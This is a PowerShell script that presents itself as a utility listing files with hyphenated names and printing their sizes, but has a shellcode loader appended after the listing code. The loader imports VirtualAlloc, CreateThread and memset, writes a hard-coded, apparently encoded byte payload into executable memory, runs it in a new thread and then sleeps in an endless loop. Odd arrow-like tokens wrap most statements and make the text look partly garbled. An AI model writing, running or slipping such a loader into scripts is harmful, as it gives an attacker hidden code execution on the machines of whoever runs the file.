

[CmdletBinding()]
Param(
    [Parameter(Mandatory=$True,Position=0)]
        [String]$Path
)



 -||-> $files =  -||-> ls -r $Path | ? {  -||-> $_.Name -match ".*\-.*" <-||-  } <-||-  <-||- 

 -||-> $files | Select-Object BaseName, Length | Sort-Object Length | ConvertTo-Csv -Delimiter "`t" <-||- 
 -||-> $y7xF = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $y7xF -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xd9,0xc7,0xbb,0x3d,0xc9,0x77,0x7e,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xb1,0x47,0x31,0x58,0x18,0x03,0x58,0x18,0x83,0xc0,0x39,0x2b,0x82,0x82,0xa9,0x29,0x6d,0x7b,0x29,0x4e,0xe7,0x9e,0x18,0x4e,0x93,0xeb,0x0a,0x7e,0xd7,0xbe,0xa6,0xf5,0xb5,0x2a,0x3d,0x7b,0x12,0x5c,0xf6,0x36,0x44,0x53,0x07,0x6a,0xb4,0xf2,0x8b,0x71,0xe9,0xd4,0xb2,0xb9,0xfc,0x15,0xf3,0xa4,0x0d,0x47,0xac,0xa3,0xa0,0x78,0xd9,0xfe,0x78,0xf2,0x91,0xef,0xf8,0xe7,0x61,0x11,0x28,0xb6,0xfa,0x48,0xea,0x38,0x2f,0xe1,0xa3,0x22,0x2c,0xcc,0x7a,0xd8,0x86,0xba,0x7c,0x08,0xd7,0x43,0xd2,0x75,0xd8,0xb1,0x2a,0xb1,0xde,0x29,0x59,0xcb,0x1d,0xd7,0x5a,0x08,0x5c,0x03,0xee,0x8b,0xc6,0xc0,0x48,0x70,0xf7,0x05,0x0e,0xf3,0xfb,0xe2,0x44,0x5b,0x1f,0xf4,0x89,0xd7,0x1b,0x7d,0x2c,0x38,0xaa,0xc5,0x0b,0x9c,0xf7,0x9e,0x32,0x85,0x5d,0x70,0x4a,0xd5,0x3e,0x2d,0xee,0x9d,0xd2,0x3a,0x83,0xff,0xba,0x8f,0xae,0xff,0x3a,0x98,0xb9,0x8c,0x08,0x07,0x12,0x1b,0x20,0xc0,0xbc,0xdc,0x47,0xfb,0x79,0x72,0xb6,0x04,0x7a,0x5a,0x7c,0x50,0x2a,0xf4,0x55,0xd9,0xa1,0x04,0x5a,0x0c,0x5f,0x00,0xcc,0xff,0x51,0xdd,0x32,0x68,0x90,0xe2,0x4e,0x3f,0x1d,0x04,0x1e,0xef,0x4d,0x99,0xde,0x5f,0x2e,0x49,0xb6,0xb5,0xa1,0xb6,0xa6,0xb5,0x6b,0xdf,0x4c,0x5a,0xc2,0xb7,0xf8,0xc3,0x4f,0x43,0x99,0x0c,0x5a,0x29,0x99,0x87,0x69,0xcd,0x57,0x60,0x07,0xdd,0x0f,0x80,0x52,0xbf,0x99,0x9f,0x48,0xaa,0x25,0x0a,0x77,0x7d,0x72,0xa2,0x75,0x58,0xb4,0x6d,0x85,0x8f,0xcf,0xa4,0x13,0x70,0xa7,0xc8,0xf3,0x70,0x37,0x9f,0x99,0x70,0x5f,0x47,0xfa,0x22,0x7a,0x88,0xd7,0x56,0xd7,0x1d,0xd8,0x0e,0x84,0xb6,0xb0,0xac,0xf3,0xf1,0x1e,0x4e,0xd6,0x03,0x62,0x99,0x1e,0x76,0x8a,0x19 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $M3Cb=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $M3Cb.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$M3Cb,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



